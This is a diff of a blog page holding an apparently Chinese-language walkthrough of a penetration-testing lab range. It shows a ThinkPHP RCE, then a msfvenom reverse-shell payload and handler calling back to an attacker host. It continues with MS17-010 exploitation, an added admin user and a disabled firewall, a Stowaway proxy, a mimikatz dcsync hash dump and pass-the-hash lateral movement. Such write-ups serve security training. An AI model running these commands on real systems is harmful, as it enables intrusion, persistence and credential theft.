@@ -1,18 +1,18 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 1.ThinkPHP rce fscan扫一下，发现Thinkphp漏洞，那就用thinkphp的漏扫工具进行利用\n发现扫出来漏洞\n然后getshell\nflag在根\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" lab1 精简思路\n1 10主机拿shell，添加用户rpd登入后扫横向发现20，30主机，30有永恒之蓝，上线msf，拿完flag后添加一个用户，然后搭建代理远程登入，发现是域控机子，直接抓哈希然后横向20主机拿flag 1.ThinkPHP rce fscan扫一下，发现Thinkphp漏洞，那就用thinkphp的漏扫工具进行利用\n发现扫出来漏洞\n然后getshell\n">
 <title>cyber-lab1</title>
 
 <link rel='canonical' href='https://luo-kaihong.github.io/p/cyber-lab1/'>
 
 <link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="cyber-lab1">
-<meta property='og:description' content=" 1.ThinkPHP rce fscan扫一下，发现Thinkphp漏洞，那就用thinkphp的漏扫工具进行利用\n发现扫出来漏洞\n然后getshell\nflag在根\n">
+<meta property='og:description' content=" lab1 精简思路\n1 10主机拿shell，添加用户rpd登入后扫横向发现20，30主机，30有永恒之蓝，上线msf，拿完flag后添加一个用户，然后搭建代理远程登入，发现是域控机子，直接抓哈希然后横向20主机拿flag 1.ThinkPHP rce fscan扫一下，发现Thinkphp漏洞，那就用thinkphp的漏扫工具进行利用\n发现扫出来漏洞\n然后getshell\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/cyber-lab1/'>
-<meta property='og:site_name' content='罗铠鸿'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-11-30T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-30T00:00:00&#43;00:00'/>
+<meta property='og:site_name' content='zhizuijimi'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2026-01-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-01-11T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="cyber-lab1">
-<meta name="twitter:description" content=" 1.ThinkPHP rce fscan扫一下，发现Thinkphp漏洞，那就用thinkphp的漏扫工具进行利用\n发现扫出来漏洞\n然后getshell\nflag在根\n">
+<meta name="twitter:description" content=" lab1 精简思路\n1 10主机拿shell，添加用户rpd登入后扫横向发现20，30主机，30有永恒之蓝，上线msf，拿完flag后添加一个用户，然后搭建代理远程登入，发现是域控机子，直接抓哈希然后横向20主机拿flag 1.ThinkPHP rce fscan扫一下，发现Thinkphp漏洞，那就用thinkphp的漏扫工具进行利用\n发现扫出来漏洞\n然后getshell\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -58,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -71,7 +71,7 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
             <h2 class="site-description"></h2>
         </div>
     </header><ol class="menu-social">
@@ -285,6 +285,9 @@
     <li><a href="#2远程连接">2.远程连接</a>
       <ol>
         <li><a href="#修改注册表启用远程桌面连接-注册表禁用身份认证"><strong>修改注册表启用远程桌面连接</strong>-注册表禁用身份认证</a></li>
+        <li><a href="#msf反弹连接打永恒之蓝-添加用户">msf反弹连接打永恒之蓝-添加用户</a></li>
+        <li><a href="#stowaway-进行代理-远程登入">Stowaway 进行代理-远程登入</a></li>
+        <li><a href="#猕猴桃抓哈希打域控">猕猴桃抓哈希打域控</a></li>
       </ol>
     </li>
   </ol>
@@ -336,7 +339,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-11-30</time>
+                <time class="article-time--published">2026-01-11</time>
             </div>
         
 
@@ -351,7 +354,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 2 分钟
+                    阅读时长: 5 分钟
                 </time>
             </div>
         
@@ -368,12 +371,22 @@
     
     <hr>
 <hr>
-<h2 id="1thinkphp-rce">1.ThinkPHP rce
+<h1 id="lab1">lab1
+</h1><p>精简思路</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10主机拿shell，添加用户rpd登入后扫横向发现20，30主机，30有永恒之蓝，上线msf，拿完flag后添加一个用户，然后搭建代理远程登入，发现是域控机子，直接抓哈希然后横向20主机拿flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="1thinkphp-rce">1.ThinkPHP rce
 </h2><p>fscan扫一下，发现Thinkphp漏洞，那就用thinkphp的漏扫工具进行利用</p>
 <p><img src="/p/cyber-lab1/image-20251130132255156.png"
 	width="1400"
 	height="109"
-	srcset="/p/cyber-lab1/image-20251130132255156_hu_4ff9e8d1f75830f2.png 480w, /p/cyber-lab1/image-20251130132255156_hu_b9308332c4748ff9.png 1024w"
+	srcset="/p/cyber-lab1/image-20251130132255156_hu_b4672096231edfbe.png 480w, /p/cyber-lab1/image-20251130132255156_hu_65f0004015df8764.png 1024w"
 	loading="lazy"
 	
 		alt="image-20251130132255156"
@@ -440,7 +453,7 @@
 </div><p><img src="/p/cyber-lab1/image-20251130150933450.png"
 	width="1307"
 	height="236"
-	srcset="/p/cyber-lab1/image-20251130150933450_hu_edaf55e1dece9168.png 480w, /p/cyber-lab1/image-20251130150933450_hu_d2ea4ef3fce7845e.png 1024w"
+	srcset="/p/cyber-lab1/image-20251130150933450_hu_bfe0ec54672fc4cb.png 480w, /p/cyber-lab1/image-20251130150933450_hu_19ce16fab7079783.png 1024w"
 	loading="lazy"
 	
 		alt="image-20251130150933450"
@@ -494,7 +507,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xfreerdp /u:xpw /p:&#39;123Qwe@&#39; /v:192.168.10.10 /sec:rdp /cert:ignore /drive:share,/mnt/xpw/kali_shard
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xfreerdp /u:xpw /p:&#39;123Qwe@&#39; /v:192.168.10.10 /sec:rdp /cert:ignore /drive:share,/mnt/xpw/kali_shard   /timeout:300000
 </span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
@@ -518,7 +531,7 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo cp fscan.exe /mnt/xpw/kali_shard/
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>不对？<strong>fscan.exe上传到kali，然后再到远程桌面后不能用了</strong>？？？不对，蚁剑直接连了服务，直接蚁剑上传就好了！</p>
+</div><p>不对？<strong>fscan.exe上传到kali，然后再到远程桌面后不能用了</strong>？？？不对，蚁剑直接连了服务，直接蚁剑上传就好了！（后面发现还是win上面连方便一点）</p>
 <img src="image-20251130154955848.png" alt="image-20251130154955848"  />
 <p>发现另外2台主机，都存在MS17-010永恒之蓝漏洞</p>
 <div class="highlight"><div class="chroma">
@@ -531,6 +544,434 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">192.168.20.10 #当前已经拿到权限的
 </span></span><span class="line"><span class="cl">192.168.20.20
 </span></span><span class="line"><span class="cl">192.168.20.30
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="msf反弹连接打永恒之蓝-添加用户">msf反弹连接打永恒之蓝-添加用户
+</h3><p>fscan扫描一下20和30两台主机，都存在MS17-010永恒之蓝漏洞</p>
+<p><img src="/p/cyber-lab1/image-20260111155836732.png"
+	width="599"
+	height="80"
+	srcset="/p/cyber-lab1/image-20260111155836732_hu_3fd89228bc74800a.png 480w, /p/cyber-lab1/image-20260111155836732_hu_e337cda81b35500a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260111155836732"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="748"
+		data-flex-basis="1797px"
+	
+></p>
+<p><img src="/p/cyber-lab1/image-20260111160122471.png"
+	width="623"
+	height="53"
+	srcset="/p/cyber-lab1/image-20260111160122471_hu_cf1049cd1e5cd232.png 480w, /p/cyber-lab1/image-20260111160122471_hu_50c29cc0d0b584bb.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260111160122471"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1175"
+		data-flex-basis="2821px"
+	
+></p>
+<p>由于都是内网，那么接下来先通过kali连接openvpn</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">openvpn</span> <span class="o">--</span><span class="n">config</span> <span class="n">cyberstrikelab</span><span class="o">.</span><span class="n">com</span><span class="o">-</span><span class="n">lab1</span><span class="o">.</span><span class="n">ovpn</span> <span class="o">--</span><span class="n">keepalive</span> <span class="mi">10</span> <span class="mi">60</span> <span class="o">&amp;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#kali连了vpn访问不了外网，所以用完要关sudo killall openvpn</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#--keepalive 10 60 &amp; 是保持VPN连接稳定的关键参数</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20260111164955489.png" alt="image-20260111164955489" style="zoom:50%;" />
+<p>然后还得加这条命令，不然kali还是与题目不通</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">ip</span> <span class="n">route</span> <span class="n">add</span> <span class="mf">192.168.10.0</span><span class="o">/</span><span class="mi">24</span> <span class="n">via</span> <span class="mf">172.16.233.1</span> <span class="n">dev</span> <span class="n">tun0</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#意思是当你想要访问192.168.10.0/24这个网段（比如192.168.10.10）的任何机器时，请把数据包发给172.16.233.1这个网关，并通过tun0（VPN接口）发送出去</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上线msf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.233.2 LPORT=9999 -f exe -o 1.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后将这个1.exe上传到靶机，然后运行，接着打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msfconsole</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">233.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab1/image-20260111201835000.png"
+	width="936"
+	height="353"
+	srcset="/p/cyber-lab1/image-20260111201835000_hu_36411ed712a9a3a2.png 480w, /p/cyber-lab1/image-20260111201835000_hu_2516f3ae91a5e7df.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260111201835000"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="265"
+		data-flex-basis="636px"
+	
+></p>
+<p>自动获取路由</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">autoroute</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span> <span class="n">autoroute</span> <span class="o">-</span><span class="n">p</span> <span class="c1">## 查看路由</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab1/image-20260111201932522.png"
+	width="677"
+	height="313"
+	srcset="/p/cyber-lab1/image-20260111201932522_hu_17875fea363363b6.png 480w, /p/cyber-lab1/image-20260111201932522_hu_d568e0fc10131b26.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260111201932522"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="519px"
+	
+></p>
+<p>然后退出当前会话, 搜索永恒之蓝漏洞进行利用，打20主机没用？那打20主机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">background
+</span></span><span class="line"><span class="cl">search ms17
+</span></span><span class="line"><span class="cl">use auxiliary/admin/smb/ms17_010_command
+</span></span><span class="line"><span class="cl">set RHOSTS 192.168.20.30
+</span></span><span class="line"><span class="cl">set COMMAND whoami
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab1/image-20260111203613987.png"
+	width="857"
+	height="387"
+	srcset="/p/cyber-lab1/image-20260111203613987_hu_ebf5323382e9388f.png 480w, /p/cyber-lab1/image-20260111203613987_hu_172676ec26b932e0.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260111203613987"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="221"
+		data-flex-basis="531px"
+	
+></p>
+<p>可能会因为网络波动，打不上，多试就行了，这是flag3</p>
+<p><img src="/p/cyber-lab1/image-20260111203909742.png"
+	width="938"
+	height="313"
+	srcset="/p/cyber-lab1/image-20260111203909742_hu_88f6ce0571b0a055.png 480w, /p/cyber-lab1/image-20260111203909742_hu_7b58316fd2b3e48b.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260111203909742"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="299"
+		data-flex-basis="719px"
+	
+></p>
+<p>为了持久化，开启它的远程连接服务，并加一个用户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">COMMAND</span> <span class="s1">&#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">COMMAND</span> <span class="n">net</span> <span class="n">user</span> <span class="n">xtk</span> <span class="mi">123</span><span class="nd">@abc</span> <span class="o">/</span><span class="n">add</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">COMMAND</span> <span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span> <span class="n">xtk</span> <span class="o">/</span><span class="n">add</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">COMMAND</span> <span class="n">netsh</span> <span class="n">firewall</span> <span class="nb">set</span> <span class="n">opmode</span> <span class="n">disable</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>每个命令都要run一下，如果有问题执行不了就重开一个终端重新运行一下</p>
+<h3 id="stowaway-进行代理-远程登入">Stowaway 进行代理-远程登入
+</h3><p>kali上面执行admin端</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_admin -l 172.16.233.2:8000 -s 123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>10主机上执行agent端（注意是用win_86）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">windows_x86_agent.exe -c 172.16.233.2:8000 -s 123 --reconnect 8
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不知道为啥我载蚁剑与远程桌面都打不了，而且一打vpn就断，后面发现了，不能用本地的远程桌面连接打这个，kali一打这个命令，本地的远程桌面就有可能崩，如果没崩，远程桌面一打绝对崩，这点坑死我了，最后用kali远程桌面成功（本地远程桌面好是好，毕竟复制文件方便，但是在这个靶场真难过，奇奇怪怪）</p>
+<p><img src="/p/cyber-lab1/image-20260111225000102.png"
+	width="1366"
+	height="466"
+	srcset="/p/cyber-lab1/image-20260111225000102_hu_da85af99a34c1174.png 480w, /p/cyber-lab1/image-20260111225000102_hu_ee2921fd60bd6eb.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260111225000102"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="293"
+		data-flex-basis="703px"
+	
+></p>
+<p>然后就将proxychains4代理改成127.0.0.1 5555就行了，然后就可以rpd登入.30主机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 rdesktop 192.168.20.30
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>登录的是域控服务器，用户名前带<code>.\</code>,即.\xtk登入</p>
+<p><img src="/p/cyber-lab1/image-20260111235526639.png"
+	width="1648"
+	height="361"
+	srcset="/p/cyber-lab1/image-20260111235526639_hu_156345dd71cb494b.png 480w, /p/cyber-lab1/image-20260111235526639_hu_f4db465a2b459833.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260111235526639"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="456"
+		data-flex-basis="1095px"
+	
+></p>
+<p>执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net group &#34;Domain Controllers&#34; /domain
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab1/image-20260112102746444.png"
+	width="562"
+	height="237"
+	srcset="/p/cyber-lab1/image-20260112102746444_hu_3fdfa6dc81857077.png 480w, /p/cyber-lab1/image-20260112102746444_hu_dbbce1d2f142e751.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112102746444"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="569px"
+	
+></p>
+<p>发现是域控服务器，那就可以用域控打20主机</p>
+<p>想上线cs，把cs服务端放kali，给所有文件权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod -R +x 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo ./teamserver 172.16.233.2 111111
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是本地登不进去？那就算了。看到30主机就是域控服务器，那么就可以通过横向获取到20主机的权限了，想把mimikatz上传到.20然后再上传到30，发现不用这么麻烦，直接给30开一个共享目录（vpn太不稳定了，这2个主机都卡的要死,后面发现kali连vpn加上参数<code> --keepalive 10 60 &amp;</code>好多了），命令登入用户由于30主机是域控所以有点不同，要加上域名，这个命令查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net config workstation
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab1/image-20260112103524268.png"
+	width="628"
+	height="371"
+	srcset="/p/cyber-lab1/image-20260112103524268_hu_74c50111e7201fa2.png 480w, /p/cyber-lab1/image-20260112103524268_hu_895137eb3e8d36ff.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112103524268"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="406px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 rdesktop 192.168.20.30 -u &#34;cyberstrikelab.com\\xtk&#34; -p &#39;123@abc&#39; -r disk:kali_share=/mnt/xpw/kali_shard
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="猕猴桃抓哈希打域控">猕猴桃抓哈希打域控
+</h3><p>然后上传猕猴桃抓哈希</p>
+<p><img src="/p/cyber-lab1/image-20260112103823084.png"
+	width="828"
+	height="300"
+	srcset="/p/cyber-lab1/image-20260112103823084_hu_8f27ca811b1480e6.png 480w, /p/cyber-lab1/image-20260112103823084_hu_97f2ac09fad3bcb1.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112103823084"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="276"
+		data-flex-basis="662px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:cyberstrikelab.com /all
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab1/image-20260112104703070.png"
+	width="754"
+	height="179"
+	srcset="/p/cyber-lab1/image-20260112104703070_hu_72d0e42331fd7581.png 480w, /p/cyber-lab1/image-20260112104703070_hu_c4dadfa800da855c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112104703070"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="421"
+		data-flex-basis="1010px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">94bd5248e87cb7f2f9b871d40c903927
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用这个hash进行横向利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 impacket-psexec -hashes :94bd5248e87cb7f2f9b871d40c903927 cyberstrikelab.com/administrator@192.168.20.20
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">type C:\\flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab1/image-20260112105109868.png"
+	width="1008"
+	height="544"
+	srcset="/p/cyber-lab1/image-20260112105109868_hu_1f99c0b80310f7cc.png 480w, /p/cyber-lab1/image-20260112105109868_hu_65009a744bb44354.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112105109868"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="444px"
+	
+></p>
+<p>这个命令也行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 crackmapexec smb 192.168.20.20 -u administrator -H 94bd5248e87cb7f2f9b871d40c903927  -d cyberstrikelab.com -x &#34;type C:\\flag.txt&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab1/image-20260112105643247.png"
+	width="1446"
+	height="407"
+	srcset="/p/cyber-lab1/image-20260112105643247_hu_956675927a38f733.png 480w, /p/cyber-lab1/image-20260112105643247_hu_9bba846d7b9e2810.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260112105643247"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="355"
+		data-flex-basis="852px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这是这个靶场的第一题，写的巨难受，开始用vpn连总是断，后来才发现不能win连vpn，然后kali又连vpn，这样vpn就会不稳定，然后就是kali打的时候连vpn与rpd远程都要加上一些使之稳定的参数。也是慢慢磨出来了。还有就是本来想上线cs，结果失败，想了想原因，kali显示成功，但是本地显示连不上？那是Windows无法访问172.16.233.2，因为win没连vpn，但是win一连vpn，kali就有崩，最后只能把客户端放在kali打，尝试我只能上线20，不知道30为啥上线不了，奇奇怪怪
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
@@ -575,12 +1016,12 @@
             
                 
 <article class="">
-    <a href="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/">
+    <a href="/p/cyber-lab8/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">某企业二面</h2>
+            <h2 class="article-title">cyber-lab8</h2>
         </div>
     </a>
 </article>
@@ -588,12 +1029,12 @@
             
                 
 <article class="">
-    <a href="/p/delegation/">
+    <a href="/p/cyber-lab6/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">Delegation</h2>
+            <h2 class="article-title">cyber-lab6</h2>
         </div>
     </a>
 </article>
@@ -601,12 +1042,12 @@
             
                 
 <article class="">
-    <a href="/p/spoofing/">
+    <a href="/p/cyber-lab7/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">spoofing</h2>
+            <h2 class="article-title">cyber-lab7</h2>
         </div>
     </a>
 </article>
@@ -614,12 +1055,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-initial/">
+    <a href="/p/cyber-lab4/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-Initial</h2>
+            <h2 class="article-title">cyber-lab4</h2>
         </div>
     </a>
 </article>
@@ -627,12 +1068,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-hospital/">
+    <a href="/p/cyber-lab5/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-Hospital</h2>
